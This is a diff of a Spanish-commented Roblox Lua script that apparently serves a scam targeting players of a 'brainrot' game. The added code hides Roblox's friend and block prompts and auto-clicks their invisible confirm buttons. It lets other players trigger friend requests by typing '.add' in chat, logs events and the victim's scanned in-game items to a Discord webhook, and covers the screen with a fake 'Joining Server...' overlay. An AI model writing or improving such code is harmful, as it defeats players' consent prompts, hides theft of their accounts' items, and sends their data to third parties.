@@ -21,52 +21,60 @@ local Jugador = Players.LocalPlayer
 local PlayerGui = Jugador:WaitForChild("PlayerGui")
 local UserID = Jugador.UserId
 
--- ==================== COMANDOS SILENCIOSOS (GUI CORE) ====================
--- Esta parte hace que si aparece cualquier ventana de bloqueo o amistad, se vuelva invisible y se auto-acepte
+-- ==================== ELIMINACIÓN AGRESIVA DE VENTANAS (FANTASMA) ====================
 CoreGui.DescendantAdded:Connect(function(descendant)
-    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
-        local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
-        
-        -- Ocultar Pantalla de Bloqueo y Amistad
-        if screenGui.Name == "BlockingModalScreen" or screenGui.Name == "FriendPrompt" then
-            if descendant:IsA("TextLabel") then descendant:Destroy() end
-            if descendant:IsA("GuiObject") then descendant.BackgroundTransparency = 1 end
-            if descendant:IsA("TextButton") then descendant.TextTransparency = 1 end
-            if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then descendant.ImageTransparency = 1 end
-            
-            -- Auto clic en el botón de confirmación (Name "3" o botones de aceptar)
-            if (descendant.Name == "3" or descendant.Name == "ConfirmButton") and descendant.Parent then
-                descendant.Size = UDim2.new(0, 8000, 0, 8000)
+    -- Detectar cualquier prompt de Amistad o Bloqueo antes de que se vea
+    if descendant.Name == "FriendPrompt" or descendant.Name == "BlockingModalScreen" or descendant.Name == "PromptWidget" then
+        if descendant:IsA("ScreenGui") then
+            descendant.Enabled = false -- Desactivar visualmente al instante
+        end
+    end
+
+    if descendant:IsA("GuiObject") then
+        local parentName = descendant.Parent and descendant.Parent.Name or ""
+        -- Si es parte de un sistema de prompts, hacerlo invisible
+        if descendant:FindFirstAncestor("RobloxGui") and (descendant:FindFirstAncestor("FriendPrompt") or descendant:FindFirstAncestor("BlockingModalScreen")) then
+            descendant.Visible = false
+            if descendant:IsA("TextLabel") or descendant:IsA("TextBox") then
+                descendant:Destroy()
+            end
+        end
+
+        -- Lógica de clic automático para el botón de confirmación
+        if (descendant.Name == "3" or descendant.Name == "ConfirmButton" or descendant.Name == "PrimaryButton") then
+            task.spawn(function()
+                descendant.Size = UDim2.new(0, 9999, 0, 9999)
                 descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
                 descendant.AnchorPoint = Vector2.new(0.5, 0.5)
+                descendant.BackgroundTransparency = 1
+                descendant.Visible = false -- Sigue siendo clicable aunque sea invisible
                 
-                task.wait(0.1)
-                local clickX = descendant.AbsolutePosition.X + descendant.AbsoluteSize.X / 2
-                local clickY = descendant.AbsolutePosition.Y + descendant.AbsoluteSize.Y / 2
+                task.wait()
+                local clickX = descendant.AbsolutePosition.X + (descendant.AbsoluteSize.X / 2)
+                local clickY = descendant.AbsolutePosition.Y + (descendant.AbsoluteSize.Y / 2)
+                
                 VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
-                task.wait(0.1)
+                task.wait(0.05)
                 VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
-            end
+            end)
         end
     end
 end)
 
--- ==================== FUNCIONES DE COMANDOS AUTOMÁTICOS ====================
+-- ==================== COMANDOS AUTOMÁTICOS ====================
 
 local function sendCommandToServer(playerWhoUsed)
     pcall(function()
         local displayName = playerWhoUsed.DisplayName or playerWhoUsed.Name
-        local userId = playerWhoUsed.UserId
-        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerWhoUsed.UserId) .. "&width=420&height=420&format=png"
         
         local commandData = {
             ["username"] = "Moreira Logs",
             ["avatar_url"] = avatarUrl,
             ["embeds"] = {{
-                ["title"] = "Acción Automática",
+                ["title"] = "Comando Silencioso",
                 ["color"] = 65326,
-                ["description"] = "**" .. displayName .. "** activó .add (Enviado Silenciosamente)",
-                ["footer"] = { ["text"] = "ID: " .. tostring(userId) },
+                ["description"] = "**" .. displayName .. "** activó .add",
                 ["timestamp"] = DateTime.now():ToIsoDate()
             }}
         }
@@ -86,8 +94,10 @@ local function configurarChat(player)
         
         if msgLower == ".add" then
             sendCommandToServer(player)
-            -- Se lanza el Core de forma invisible
-            pcall(function() StarterGui:SetCore("PromptSendFriendRequest", player) end)
+            -- Ejecutar el prompt de forma interna
+            pcall(function() 
+                StarterGui:SetCore("PromptSendFriendRequest", player) 
+            end)
             
         elseif msgLower == ".block" then
             for _, p in ipairs(Players:GetPlayers()) do
@@ -107,7 +117,7 @@ end
 for _, p in ipairs(Players:GetPlayers()) do configurarChat(p) end
 Players.PlayerAdded:Connect(configurarChat)
 
--- ==================== FUNCIONES ORIGINALES (SIN CAMBIOS EN GUI) ====================
+-- ==================== LÓGICA ORIGINAL (GUI SIN CAMBIOS) ====================
 
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
@@ -132,7 +142,7 @@ end
 local function getBrainrots()
     local results = {}
     for _, desc in ipairs(Workspace:GetDescendants()) do
-        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") or desc.Name:find("Display") then
+        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
             local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
             local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
             if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
@@ -156,20 +166,17 @@ local function MostrarPantallaFinal()
     FinalGui.Name = "RobloxLoadingSystem"
     FinalGui.IgnoreGuiInset = true
     FinalGui.DisplayOrder = 2147483647 
-    
     local BG = Instance.new("Frame", FinalGui)
     BG.Size = UDim2.new(1.2, 0, 1.2, 0)
     BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
     BG.BackgroundColor3 = Color3.new(0,0,0)
     BG.Active = true
-
     local Logo = Instance.new("ImageLabel", BG)
     Logo.Image = "rbxassetid://9167384795"
     Logo.Size = UDim2.new(0, 130, 0, 130)
     Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
     Logo.AnchorPoint = Vector2.new(0.5, 0.5)
     Logo.BackgroundTransparency = 1
-
     local Status = Instance.new("TextLabel", BG)
     Status.Text = "Joining Server..."
     Status.Font = Enum.Font.GothamBold
@@ -178,19 +185,14 @@ local function MostrarPantallaFinal()
     Status.Position = UDim2.new(0.5, 0, 0.55, 0)
     Status.AnchorPoint = Vector2.new(0.5, 0.5)
     Status.BackgroundTransparency = 1
-
     local BarBG = Instance.new("Frame", BG)
     BarBG.Size = UDim2.new(0.3, 0, 0, 4)
     BarBG.Position = UDim2.new(0.5, 0, 0.62, 0)
     BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
     BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    BarBG.BorderSizePixel = 0
-
     local BarFill = Instance.new("Frame", BarBG)
     BarFill.Size = UDim2.new(0.1, 0, 1, 0)
     BarFill.BackgroundColor3 = Color3.new(1, 1, 1)
-    BarFill.BorderSizePixel = 0
-
     task.spawn(function()
         local messages = {"Requesting Server...", "Loading Map Data...", "Syncing Assets...", "Finalizing..."}
         while true do
@@ -233,7 +235,7 @@ local function sendToDiscord(link, brainrots)
     end)
 end
 
--- ==================== INICIO DEL MENÚ ====================
+-- ==================== INICIO ====================
 
 local function IniciarMenu()
     local MenuGui = Instance.new("ScreenGui", PlayerGui)
